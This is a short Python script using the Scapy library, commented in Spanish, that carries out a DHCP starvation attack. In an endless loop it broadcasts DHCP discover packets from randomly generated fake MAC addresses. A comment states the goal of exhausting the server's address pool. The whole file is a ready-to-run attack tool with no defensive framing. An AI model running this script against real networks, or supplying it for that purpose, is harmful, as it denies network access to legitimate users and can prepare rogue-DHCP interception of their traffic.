from scapy.all import *
import time

def dhcp_starvation():
    print("Iniciando DHCP Starvation...")
    conf.checkIPaddr = False
    
    while True:
        # Generamos una MAC aleatoria
        fake_mac = RandMAC()
        # Convertimos la MAC a un formato binario que Scapy acepte sin quejas
        # chaddr requiere 16 bytes; los primeros 6 son la MAC, el resto padding
        mac_raw = mac2str(fake_mac) 

        pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac_raw) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, verbose=0)
        # Un pequeño delay opcional para no saturar el CPU local, pero sí el pool
        # time.sleep(0.01) 

if __name__ == "__main__":
    dhcp_starvation()